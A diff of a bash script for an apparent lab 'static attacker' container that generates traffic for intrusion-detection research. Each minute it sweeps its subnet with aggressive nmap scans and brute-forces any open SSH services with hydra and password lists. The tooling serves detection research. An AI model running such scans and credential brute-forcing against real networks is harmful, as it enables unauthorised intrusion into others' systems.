@@ -1,41 +1,74 @@
 #!/bin/bash
-# Static attacker entrypoint — deterministic, mechanical.
-# Every 5 minutes it scans the whole network subnet it is attached to with
-# nmap -sS -A and brute-forcing scripts (ssh/ftp/http). The Aracne pivot
-# (attacker_pivot) keeps the LLM-driven part; this device does the noisy,
-# repeatable brute-force part.
+# Static attacker entrypoint — deterministic, mechanical, high-cadence.
+# Every ATTACK_INTERVAL seconds (default 60) it runs a fresh nmap -sS -A
+# sweep of its network subnet, followed by a dedicated SSH brute-forcing pass
+# through nmap's ssh-brute NSE script driven with curated user/pass lists.
 #
-# Target subnet is derived from the container's own interface (works on any
-# network, no hardcoded IPs), overridable via TARGET_SUBNET.
+# Why this cadence: SLIPS fires alerts per (profile, timewindow) — fresh
+# nmap evidence arriving each minute keeps every TW's attack-labelling alive
+# (the FL module's alert-based labels depend on recurring evidence). The old
+# 5-minute sweep left large label-less gaps in a 5-minute SLIPS time window;
+# with this interval every window has new evidence, always.
+#
+# Baseline gating: stays quiet until the experiment runner creates
+# /tmp/start_static_attacker at attack-phase start (same instant Aracne
+# launches). Standalone: docker exec <c> touch /tmp/start_static_attacker
+#
+# Targets: derived from the container's own interface (no hardcoded IPs);
+# override with TARGET_SUBNET. Cadence tunables: ATTACK_INTERVAL.
+
+set -u
 
 INTERFACE=$(ip route | awk '/default/ {for (i=1;i<=NF;i++) if ($i=="dev"){print $(i+1); exit}}')
 INTERFACE=${INTERFACE:-eth0}
 SUBNET=${TARGET_SUBNET:-$(ip -o -4 addr show "$INTERFACE" 2>/dev/null | awk '{print $4}')}
 SUBNET=${SUBNET:-10.0.0.0/8}
+INTERVAL=${ATTACK_INTERVAL:-60}
 NOW=$(date -u +%Y%m%d_%H%M%S)
 LOG=/var/log/static_attacker/nmap_${NOW}.log
 : > "$LOG"
 
-echo "[static-attacker] interface=$INTERFACE subnet=$SUBNET log=$LOG"
+# Canonicalize the password list once (nmap's passwords.lst carries comments)
+PASSDB=/tmp/passwords.txt
+grep -v -e '^#' -e '^$' /usr/share/nmap/nselib/data/passwords.lst > "$PASSDB" 2>/dev/null || \
+  cp /usr/share/nmap/nselib/data/passwords.lst "$PASSDB"
 
-# Experiment phase gating: stay quiet during the baseline period so the first
-# FL training windows are truly benign. The experiment runner creates
-# /tmp/start_static_attacker when the attack phase begins (same moment it
-# launches Aracne). Standalone use: docker exec <c> touch /tmp/start_static_attacker
-echo "[static-attacker] waiting for /tmp/start_static_attacker (attack phase start)..."
+echo "[static-attacker] interface=$INTERFACE subnet=$SUBNET interval=${INTERVAL}s log=$LOG" | tee -a "$LOG"
+
+echo "[static-attacker] waiting for /tmp/start_static_attacker (attack phase start)..." | tee -a "$LOG"
 while [ ! -f /tmp/start_static_attacker ]; do
   sleep 2
 done
-echo "[static-attacker] attack phase started — engaging"
+echo "[static-attacker] attack phase started — engaging" | tee -a "$LOG"
 
 while true; do
-  echo "===== $(date -u +%F\ %T) scanning $SUBNET =====" >> "$LOG"
-  nmap -sS -A -sV \
+  cycle=$(date -u +%F\ %T)
+  echo "===== $cycle sweep $SUBNET (nmap -sS -A) =====" >> "$LOG"
+  # aggressive SYN scan of the subnet: -A implies -sV/-O/script/traceroute;
+  # -A is the mechanical part that feeds SLIPS's portscan/related alerts.
+  nmap -sS -A -T4 \
     --top-ports 1000 \
-    --script=default,ssh-brute,ftp-brute,http-brute \
-    --script-args "userdb=/root/users.txt,brute.firstonly=true" \
     --exclude 127.0.0.0/8,localhost \
     "$SUBNET" >> "$LOG" 2>&1 || true
-  echo "===== scan done $(date -u +%F\ %T) =====" >> "$LOG"
-  sleep 300   # every 5 minutes
+
+  echo "===== $cycle ssh-brute pass $SUBNET (nmap discover + hydra) =====" >> "$LOG"
+  # SSH brute-forcing: nmap discovers live ssh services, hydra forces them
+  # with the same curated lists. nmap's ssh-brute NSE script can't be used in
+  # this image (libssh2-utility handshake error against OpenSSH >=8.9), so
+  # hydra stands in while nmap keeps the discovery/drive responsibility.
+  nmap -sS -T4 -p 22 --open -oG - \
+    --exclude 127.0.0.0/8,localhost \
+    "$SUBNET" 2>/dev/null | awk '/22\/open/ {print $2}' > /tmp/ssh_targets.txt
+  if [ -s /tmp/ssh_targets.txt ]; then
+    while read -r host; do
+      [ -n "$host" ] || continue
+      echo "-- hydra ssh://$host (users=/root/users.txt, passes=passwords.lst)" >> "$LOG"
+      timeout 45 hydra -L /root/users.txt -P "$PASSDB" \
+        -t 4 -f -V "ssh://$host" >> "$LOG" 2>&1 || true
+    done < /tmp/ssh_targets.txt
+  else
+    echo "-- no ssh services found on $SUBNET" >> "$LOG"
+  fi
+  echo "===== cycle done $(date -u +%F\ %T) =====" >> "$LOG"
+  sleep "$INTERVAL"
 done
